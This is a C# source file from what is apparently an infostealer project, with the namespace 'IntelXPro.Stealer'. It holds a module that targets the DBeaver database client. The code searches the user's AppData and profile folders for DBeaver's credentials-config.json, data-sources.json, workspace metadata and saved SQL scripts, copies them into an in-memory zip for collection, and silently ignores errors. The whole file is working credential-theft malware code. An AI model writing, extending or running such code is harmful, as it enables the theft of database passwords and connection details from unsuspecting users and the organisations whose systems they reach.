using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class DBeaver : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".dbeaver");
            string userProfilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".dbeaver");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "DBeaver";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, zip, counterApplications);
            }

            if (Directory.Exists(userProfilePath) && userProfilePath != appDataPath)
            {
                foundData |= CollectFromDirectory(userProfilePath, zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] configFiles = new string[]
                {
                    "credentials-config.json",
                    "data-sources.json",
                    "workspace6\\General\\.dbeaver\\credentials-config.json",
                    "workspace6\\General\\.dbeaver\\data-sources.json",
                    "workspace6\\General\\.dbeaver\\project-metadata.json",
                    "workspace6\\General\\.metadata\\.plugins\\org.jkiss.dbeaver.core\\scripts\\*.sql"
                };

                foreach (string configPattern in configFiles)
                {
                    string fullPattern = Path.Combine(basePath, configPattern);
                    
                    if (configPattern.Contains("*"))
                    {
                        string directory = Path.GetDirectoryName(fullPattern);
                        string searchPattern = Path.GetFileName(fullPattern);
                        
                        if (Directory.Exists(directory))
                        {
                            string[] files = Directory.GetFiles(directory, searchPattern, SearchOption.TopDirectoryOnly);
                            foreach (string file in files)
                            {
                                string relativePath = file.Substring(basePath.Length + 1);
                                string zipPath = "Applications\\DBeaver\\" + relativePath;
                                zip.AddFile(zipPath, File.ReadAllBytes(file));
                                counterApplications.Files.Add(file + " => " + zipPath);
                                foundData = true;
                            }
                        }
                    }
                    else
                    {
                        if (File.Exists(fullPattern))
                        {
                            string relativePath = configPattern;
                            string zipPath = "Applications\\DBeaver\\" + relativePath;
                            zip.AddFile(zipPath, File.ReadAllBytes(fullPattern));
                            counterApplications.Files.Add(fullPattern + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }

                string workspacePath = Path.Combine(basePath, "workspace6");
                if (Directory.Exists(workspacePath))
                {
                    CollectWorkspaceData(workspacePath, zip, counterApplications, ref foundData);
                }
            }
            catch
            {
            }

            return foundData;
        }

        private void CollectWorkspaceData(string workspacePath, InMemoryZip zip, Counter.CounterApplications counterApplications, ref bool foundData)
        {
            try
            {
                string[] workspaceDirs = Directory.GetDirectories(workspacePath);
                
                foreach (string workspaceDir in workspaceDirs)
                {
                    string dbeaverDir = Path.Combine(workspaceDir, ".dbeaver");
                    
                    if (Directory.Exists(dbeaverDir))
                    {
                        string[] dbeaverFiles = Directory.GetFiles(dbeaverDir, "*.*", SearchOption.AllDirectories);
                        
                        foreach (string file in dbeaverFiles)
                        {
                            string ext = Path.GetExtension(file).ToLower();
                            if (ext == ".json" || ext == ".xml" || ext == ".properties" || ext == ".sql")
                            {
                                string relativePath = file.Substring(workspacePath.Length + 1);
                                string zipPath = "Applications\\DBeaver\\workspace6\\" + relativePath;
                                zip.AddFile(zipPath, File.ReadAllBytes(file));
                                counterApplications.Files.Add(file + " => " + zipPath);
                                foundData = true;
                            }
                        }
                    }
                }
            }
            catch
            {
            }
        }
    }
}
